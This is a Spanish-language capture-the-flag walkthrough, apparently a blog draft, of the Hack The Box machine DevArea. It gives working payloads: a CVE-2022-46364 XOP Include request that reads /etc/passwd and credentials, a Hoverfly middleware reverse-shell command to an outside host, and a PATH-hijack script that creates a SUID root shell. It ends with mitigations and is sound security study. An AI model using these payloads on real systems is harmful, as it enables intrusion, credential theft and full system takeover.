---
title: "HTB Walkthrough: DevArea"
date: 2026-03-29
draft: true
description: "Walkthrough completo de la máquina DevArea de Hack The Box. Dificultad Medium, OS Linux (Ubuntu). CVE-2022-46364 Apache CXF XOP Include LFI, RCE mediante Hoverfly Middleware y escalada por Bash PATH Hijacking."
tags: ["HackTheBox", "Linux", "Medium", "CVE-2022-46364", "ApacheCXF", "SOAP", "LFI", "Hoverfly", "RCE", "PathHijacking", "PrivEsc", "devarea", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Resolución paso a paso de **DevArea** en Hack The Box. Máquina de dificultad **Medium** con sistema operativo **Linux (Ubuntu)**. Explotamos un LFI en un servicio SOAP Java mediante CVE-2022-46364, usamos las credenciales obtenidas para ejecutar código remoto a través del middleware de Hoverfly, y escalamos a root abusando de un PATH Hijacking en un script con privilegios sudo.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Medium{{< /badge >}}

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                                                       |
|----------------|-------------------------------------------------------------------------------|
| **Nombre**     | DevArea                                                                       |
| **OS**         | Linux (Ubuntu)                                                                |
| **Dificultad** | Medium                                                                        |
| **IP**         | 10.129.10.216                                                                 |
| **Técnicas**   | CVE-2022-46364 · XOP Include LFI · Hoverfly Middleware RCE · Bash PATH Hijacking |

---

## 1. Reconocimiento

### 1.1 Escaneo de Puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.10.216
```

```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
8500/tcp open  fmtp
8888/tcp open  sun-answerbook
```

Escaneo de versiones sobre los puertos abiertos:

```bash
nmap -sC -sV -p21,22,80,8080,8500,8888 10.129.10.216
```

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://devarea.htb/
8080/tcp open  http    Jetty 9.4.27.v20200227
|_http-title: Error 404 Not Found
8500/tcp open  http    Golang net/http server (Proxy — requiere auth)
8888/tcp open  http    Golang net/http server
|_http-title: Hoverfly Dashboard
```

*Puertos abiertos:*
- `21` → vsftpd 3.0.5 con **acceso anónimo habilitado**
- `22` → OpenSSH 9.6p1
- `80` → Apache 2.4.58 (redirige a `devarea.htb`)
- `8080` → Jetty 9.4.27 (404 — servicio Java sin interfaz web expuesta)
- `8500` → Proxy Golang con autenticación
- `8888` → **Hoverfly Dashboard** — panel de administración

> **💡 Dato clave:** El FTP tiene acceso anónimo y hay un Hoverfly en el 8888. Hoverfly es una herramienta de virtualización de servicios que permite ejecutar scripts externos como middleware — si conseguimos credenciales, tenemos RCE directo.

### 1.2 Enumeración Web y FTP

La web en el puerto 80 no tiene nada accionable. El gobuster solo revela subdominios que redirigen a la página principal:

```bash
gobuster vhost -u http://devarea.htb -w /usr/share/seclists/Discovery/Hostnames/subdomains-top1million-5000.txt
```

```
Found: weather.devarea.htb  → 302
Found: webapps.devarea.htb  → 302
Found: node1.devarea.htb    → 302
```

El feroxbuster sobre el puerto 8080 también devuelve vacío. El vector está en el FTP. Nos conectamos con el usuario `anonymous`:

```bash
ftp 10.129.10.216
# Usuario: anonymous / Sin contraseña
ftp> ls pub
-rw-r--r--    1 ftp      ftp       6445030 Sep 22  2025 employee-service.jar
ftp> get employee-service.jar
```

Descargamos un JAR — casi con toda certeza es el servicio que corre en el puerto 8080.

> **💡 Conclusiones:** Tenemos un JAR para analizar, un servicio Java en el 8080, y un panel de Hoverfly en el 8888 que podría darnos RCE si conseguimos credenciales. El JAR es el siguiente paso.

---

## 2. Análisis del JAR — Ingeniería Inversa

Antes de explotar nada, necesitamos entender qué hace el servicio. Descompilamos el JAR con `jadx`:

```bash
jadx -d output/ employee-service.jar
find output/ -name "*.java" | grep -vE "apache|jetty|javax|ibm"
```

```
output/sources/htb/devarea/Report.java
output/sources/htb/devarea/ServerStarter.java
output/sources/htb/devarea/EmployeeServiceImpl.java
output/sources/htb/devarea/EmployeeService.java
```

### 2.1 Endpoint del Servicio — `ServerStarter.java`

```java
public class ServerStarter {
    public static void main(String[] args) {
        JaxWsServerFactoryBean factory = new JaxWsServerFactoryBean();
        factory.setServiceClass(EmployeeService.class);
        factory.setServiceBean(new EmployeeServiceImpl());
        factory.setAddress("http://0.0.0.0:8080/employeeservice");
        factory.create();
    }
}
```

El servicio expone un endpoint SOAP en `http://devarea.htb:8080/employeeservice`. El WSDL con la descripción completa está disponible en `?wsdl`.

### 2.2 Lógica del Servicio — `EmployeeServiceImpl.java`

```java
public String submitReport(Report report) {
    String greeting = report.isConfidential()
        ? "Report marked confidential. Thank you, " + report.getEmployeeName()
        : "Report received from " + report.getEmployeeName();

    return greeting + ". Department: " + report.getDepartment()
                    + ". Content: " + report.getContent();
}
```

El campo `content` del reporte se devuelve reflejado en la respuesta. Si conseguimos inyectar el contenido de un archivo en ese campo, lo veremos en la respuesta — es el vector perfecto para un LFI.

### 2.3 Versión de Apache CXF — `pom.xml`

```bash
cat output/resources/META-INF/maven/com.environment/employee-service/pom.xml
```

```xml
<dependency>
    <groupId>org.apache.cxf</groupId>
    <artifactId>cxf-rt-frontend-jaxws</artifactId>
    <version>3.2.14</version>
</dependency>
```

> **⚠️ Versión vulnerable:** Apache CXF **3.2.14** es afectada por el **CVE-2022-46364** (versiones < 3.5.5 y < 3.4.10). Este CVE permite leer archivos arbitrarios del servidor mediante mensajes SOAP Multipart con elementos XOP Include.

---

## 3. Explotación — CVE-2022-46364 (XOP Include LFI)

### 3.1 Análisis de la Vulnerabilidad

El ataque usa **XOP (XML-binary Optimized Packaging)**, un estándar W3C que permite incluir datos binarios por referencia dentro de mensajes SOAP multipart. La referencia normalmente apunta a otra parte del mensaje mediante un `Content-ID`, pero en Apache CXF 3.2.14, también acepta referencias a archivos locales del sistema mediante el esquema `file://`.

```
Flujo normal:    SOAP multipart → xop:Include href="cid:parte" → lee la parte del mensaje
Flujo malicioso: SOAP multipart → xop:Include href="file:///etc/passwd" → lee el archivo del servidor
```

El servidor procesa la entidad, lee el archivo y devuelve su contenido **en Base64** como parte de la respuesta SOAP — y como el campo `content` se refleja directamente, lo vemos en la respuesta.

### 3.2 Verificar que el Servicio Responde

Primero confirmamos que el endpoint funciona con una petición normal:

```xml
<!-- exploit_test.xml -->
--boundary
Content-Type: text/xml; charset=UTF-8
Content-ID: <main>

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:dev="http://devarea.htb/">
  <soapenv:Header/>
  <soapenv:Body>
    <dev:submitReport>
      <arg0>
        <confidential>false</confidential>
        <content>TEST_CONTENT</content>
        <department>IT</department>
        <employeeName>Hacker</employeeName>
      </arg0>
    </dev:submitReport>
  </soapenv:Body>
</soapenv:Envelope>
--boundary--
```

```bash
curl -X POST \
  -H 'Content-Type: multipart/related; type="text/xml"; boundary="boundary"; start="<main>"' \
  -H 'SOAPAction: ""' \
  --data-binary @exploit_test.xml \
  http://devarea.htb:8080/employeeservice
```

```xml
<return>Report received from Hacker. Department: IT. Content: TEST_CONTENT</return>
```

El servicio funciona y el campo `content` se refleja. Pasamos al ataque real.

### 3.3 Leer `/etc/passwd` con XOP Include

Reemplazamos el valor de `<content>` por el elemento XOP que apunta al archivo:

```xml
<!-- exploit_passwd.xml -->
--boundary
Content-Type: text/xml; charset=UTF-8
Content-ID: <main>

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:dev="http://devarea.htb/">
  <soapenv:Header/>
  <soapenv:Body>
    <dev:submitReport>
      <arg0>
        <confidential>false</confidential>
        <content>
          <xop:Include href="file:///etc/passwd"
                       xmlns:xop="http://www.w3.org/2004/08/xop/include"/>
        </content>
        <department>IT</department>
        <employeeName>Hacker</employeeName>
      </arg0>
    </dev:submitReport>
  </soapenv:Body>
</soapenv:Envelope>
--boundary--
```

```bash
curl -X POST \
  -H 'Content-Type: multipart/related; type="text/xml"; boundary="boundary"; start="<main>"' \
  -H 'SOAPAction: ""' \
  --data-binary @exploit_passwd.xml \
  http://devarea.htb:8080/employeeservice
```

La respuesta contiene el `/etc/passwd` codificado en Base64:

```
Content: cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo...
```

```bash
echo "cm9vdDp4Oj..." | base64 -d
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
syswatch:x:984:984::/opt/syswatch:/usr/sbin/nologin
```

Dos usuarios de interés: `dev_ryan` (único usuario normal con shell) y `syswatch` (usuario de servicio en `/opt/syswatch` — relevante para privesc).

### 3.4 Extraer Credenciales de Hoverfly

Sabemos que Hoverfly corre como servicio en el puerto 8888. Leemos su unit file de systemd:

```xml
<xop:Include href="file:///etc/systemd/system/hoverfly.service"
             xmlns:xop="http://www.w3.org/2004/08/xop/include"/>
```

```bash
echo "W1VuaXRdCk..." | base64 -d
```

```ini
[Unit]
Description=HoverFly service
After=network.target

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
```

> **🔑 Credenciales obtenidas:** `admin:O7IJ27MyyXiU` para el panel de Hoverfly en el puerto 8888. Además, el proceso corre como `dev_ryan` — lo que significa que cualquier comando ejecutado desde Hoverfly lo hará como ese usuario.

---

## 4. Foothold — RCE mediante Hoverfly Middleware

**Hoverfly** es una herramienta de virtualización de servicios que puede ejecutar scripts externos llamados "middleware" para procesar el tráfico en tiempo real. La API REST de Hoverfly permite configurar ese middleware con cualquier comando del sistema — lo que es RCE directo si tenemos credenciales.

### 4.1 Obtener el Token JWT

```bash
curl -s -X POST http://devarea.htb:8888/api/token-auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin", "password":"O7IJ27MyyXiU"}'
```

```json
{"token":"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIw..."}
```

### 4.2 Configurar el Middleware con Reverse Shell

Abrimos un listener:

```bash
nc -lvnp 4444
```

Enviamos el payload al endpoint de middleware. El campo `binary` es el intérprete y `script` es el comando a ejecutar:

```bash
curl -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9..." \
  -H "Content-Type: application/json" \
  -d '{
    "binary": "/bin/bash",
    "script": "bash -i >& /dev/tcp/10.10.15.237/4444 0>&1",
    "remote": ""
  }'
```

```
Listening on 0.0.0.0 4444
Connection received on 10.129.10.216 37422
bash: no job control in this shell
dev_ryan@devarea:/opt/HoverFly$
```

✅ **Shell obtenida como `dev_ryan`.**

---

## 5. User Flag

```bash
dev_ryan@devarea:~$ cat user.txt
```

> 🔑 Flag de usuario obtenida.

---

## 6. Escalada de Privilegios — Bash PATH Hijacking

### 6.1 Enumeración del Sistema

```bash
dev_ryan@devarea:~$ sudo -l
```

```
User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh,
    !/opt/syswatch/syswatch.sh web-stop,
    !/opt/syswatch/syswatch.sh web-restart
```

Podemos ejecutar `/opt/syswatch/syswatch.sh` como root sin contraseña, pero los argumentos `web-stop` y `web-restart` están bloqueados con `!`. El script en sí no es legible ni modificable:

```bash
dev_ryan@devarea:~$ ls -la /opt/syswatch/
ls: cannot open directory '/opt/syswatch/': Permission denied
```

### 6.2 Análisis del Vector de Escalada

El script `syswatch.sh` casi con certeza invoca comandos del sistema (`ps`, `grep`, `date`...) **sin rutas absolutas**. Bash busca los comandos recorriendo el `$PATH` de izquierda a derecha — si añadimos un directorio con permisos de escritura **al inicio del PATH**, cualquier ejecutable que coloquemos ahí con el nombre de un comando del sistema será ejecutado en su lugar, con los privilegios de quien lanzó el script (root, en este caso).

Esto se conoce como **PATH Hijacking**: secuestrar la resolución de nombres de comandos redirigiendo el PATH hacia binarios bajo nuestro control.

> **💡 La clave de la privesc:** No necesitamos leer ni modificar el script. Solo necesitamos que llame a algún comando sin ruta absoluta, lo cual es prácticamente inevitable en scripts de monitorización. El sistema buscará ese comando en el PATH — y nosotros controlamos el PATH.

### 6.3 Explotación

**Paso 1 — Crear el payload en `/tmp`:**

```bash
cat > /tmp/ps << 'EOF'
#!/bin/sh
cp /bin/sh /tmp/root_sh && chmod +s /tmp/root_sh
EOF

chmod +x /tmp/ps
```

El payload copia `/bin/sh` a `/tmp/root_sh` y activa el bit **SUID**. Cuando root ejecute el script y este llame a `ps`, nuestro `/tmp/ps` se ejecutará con privilegios de root, creando una shell con SUID propiedad de root.

**Paso 2 — Secuestrar el PATH y ejecutar el script como root:**

```bash
export PATH=/tmp:$PATH
sudo /opt/syswatch/syswatch.sh --version
```

Al tener `/tmp` al inicio del PATH, cuando `syswatch.sh` llame a `ps` (u otro comando sin ruta absoluta que hayamos cubierto), bash ejecutará nuestro `/tmp/ps` en lugar del binario del sistema.

**Paso 3 — Ejecutar la shell SUID como root:**

```bash
/tmp/root_sh -p
```

```
# id
uid=1001(dev_ryan) gid=1001(dev_ryan) euid=0(root) egid=0(root)
# whoami
root
```

El flag `-p` activa el modo privilegiado de `sh`, que preserva el EUID en lugar de descartarlo al inicio (que es el comportamiento por defecto como medida de seguridad). Sin `-p`, la shell ignoraría el bit SUID.

✅ **Shell de root obtenida mediante PATH Hijacking.**

---

## 7. Root Flag

```bash
# cat /root/root.txt
```

> 🏁 Flag de root obtenida.

---

## 8. Resumen y Lecciones Aprendidas

**Ruta de compromiso:**

1. **Recon** → FTP anónimo expone `employee-service.jar`; Hoverfly Dashboard en el puerto 8888.
2. **Ingeniería inversa** → JAR decompilado revela Apache CXF 3.2.14 (CVE-2022-46364) y endpoint SOAP con campo reflejado.
3. **CVE-2022-46364** → XOP Include LFI lee `/etc/passwd` y `hoverfly.service` → credenciales `admin:O7IJ27MyyXiU`.
4. **Foothold** → Hoverfly Middleware RCE → shell como `dev_ryan` → `user.txt`.
5. **PrivEsc** → `sudo` sin `secure_path` + script opaco → PATH Hijacking → shell SUID como root → `root.txt`.

**Lo que aprendí con esta máquina:**

- **El FTP anónimo puede ser el punto de entrada más valioso.** Un JAR descargable reveló la tecnología exacta, la versión vulnerable y la estructura completa de la API. Siempre explorar el FTP anónimo en detalle antes de pasar a otros servicios.

- **CVE-2022-46364: el peligro de confiar en referencias externas en SOAP.** XOP está diseñado para optimizar la transmisión de datos binarios, pero el esquema `file://` en el atributo `href` convierte cualquier recurso local accesible por el proceso en un LFI trivial. La vulnerabilidad no requiere autenticación ni interacción especial — solo un mensaje SOAP bien formado.

- **Los unit files de systemd son una fuente de inteligencia crítica.** Las credenciales hardcodeadas en `ExecStart` son un error clásico en entornos de desarrollo que acaban llegando a producción. Con el LFI activo, leer todos los servicios de systemd debería ser siempre un paso del reconocimiento post-explotación.

- **Hoverfly Middleware es RCE por diseño si tienes credenciales.** La funcionalidad de middleware existe para casos legítimos de transformación de tráfico, pero sin restricciones de red (binding solo a localhost) es un vector de ejecución de comandos expuesto al mundo. La autenticación no es suficiente protección si las credenciales están en texto claro en el sistema.

- **PATH Hijacking funciona incluso sin leer el script objetivo.** No necesitamos saber exactamente qué comandos llama `syswatch.sh` — podemos crear binarios con nombres comunes (`ps`, `grep`, `id`, `date`) y cubrir múltiples posibilidades. La regla `sudo` con `!/arg bloqueado` da una falsa sensación de control: bloquear argumentos específicos no protege contra el secuestro del entorno de ejecución.

- **`secure_path` en sudoers es una defensa fundamental contra PATH Hijacking.** Cuando está configurado, sudo usa su propio PATH fijo independientemente del PATH del usuario, eliminando completamente este vector. Su ausencia es una misconfiguration frecuente en entornos sin hardening de sudoers.

**Mitigaciones:**

| Vector | Mitigación |
|--------|------------|
| FTP anónimo con JAR interno expuesto | Deshabilitar acceso anónimo al FTP; no exponer binarios internos en servicios públicos |
| CVE-2022-46364 (Apache CXF 3.2.14) | Actualizar a CXF ≥ 3.5.5 o ≥ 3.4.10; deshabilitar el procesamiento de referencias `file://` en XOP |
| Credenciales hardcodeadas en systemd | Usar variables de entorno o un gestor de secretos; nunca pasar credenciales como argumentos CLI |
| Hoverfly sin restricción de red | Bindear el dashboard solo a `localhost`; añadir autenticación de dos factores o restricción por IP |
| `sudo` sin `secure_path` | Añadir `Defaults secure_path=...` en `/etc/sudoers`; usar rutas absolutas en todos los comandos del script |
| Shell SUID explotable | Auditar regularmente binarios con bit SUID (`find / -perm -4000 2>/dev/null`) |